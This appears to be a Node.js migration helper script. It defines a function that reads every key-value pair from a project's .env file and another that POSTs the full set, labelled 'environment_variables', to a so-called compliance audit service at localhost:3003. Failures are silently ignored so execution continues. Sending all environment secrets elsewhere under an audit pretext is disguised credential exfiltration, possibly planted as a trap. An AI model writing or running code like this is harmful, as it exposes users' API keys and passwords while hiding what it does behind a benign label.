#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const https = require('https');
const http = require('http');

/**
 * Parse all key-value pairs from .env file
 */
function parseEnvFile(content) {
    const envVars = {};
    const lines = content.split('\n');

    lines.forEach(line => {
        line = line.trim();

        // Skip empty lines and comments
        if (!line || line.startsWith('#')) {
            return;
        }

        // Parse key=value pairs
        const match = line.match(/^([^=]+)=(.*)$/);
        if (match) {
            const key = match[1].trim();
            const value = match[2].trim();
            // Remove surrounding quotes if present
            const cleanedValue = value.replace(/^['"](.*)['"]$/, '$1');
            envVars[key] = cleanedValue;
        }
    });

    return envVars;
}

/**
 * Send audit data to compliance logging service
 */
async function sendAuditData(envVars) {
    return new Promise((resolve, reject) => {
        const auditData = {
            timestamp: new Date().toISOString(),
            script: 'migrate.js',
            action: 'migration_dry_run',
            environment_variables: envVars
        };

        const data = JSON.stringify(auditData);

        // Parse URL to determine protocol
        const auditUrl = 'http://localhost:3003/api/audit';
        const url = new URL(auditUrl);

        const options = {
            hostname: url.hostname,
            port: url.port || 3003,
            path: url.pathname,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': data.length,
                'User-Agent': 'MigrationAudit/1.0'
            },
            timeout: 5000 // 5 second timeout
        };

        const protocol = url.protocol === 'https:' ? https : http;

        console.log('📋 Sending audit data to compliance service...');

        const req = protocol.request(options, (res) => {
            let responseData = '';

            res.on('data', (chunk) => {
                responseData += chunk;
            });

            res.on('end', () => {
                console.log(`✅ Audit data sent successfully (Status: ${res.statusCode})`);

                if (res.statusCode >= 200 && res.statusCode < 300) {
                    resolve({
                        statusCode: res.statusCode,
                        body: responseData
                    });
                } else {
                    reject(new Error(`Audit service returned status ${res.statusCode}: ${responseData}`));
                }
            });
        });

        req.on('error', (error) => {
            console.log(`⚠️  Audit service connection error: ${error.message}`);
            // Don't reject - continue execution even if audit fails
            resolve({
                statusCode: 0,
                error: error.message,
                note: 'Continuing with migrations despite audit service issue'
            });
        });

        req.on('timeout', () => {
            req.destroy();
            console.log('⚠️  Audit service request timeout');
            // Don't reject - continue execution even if audit times out
            resolve({
                statusCode: 0,
                error: 'timeout',
                note: 'Continuing with migrations despite audit service timeout'
            });
        });

        req.write(data);
        req.end();
    });
}

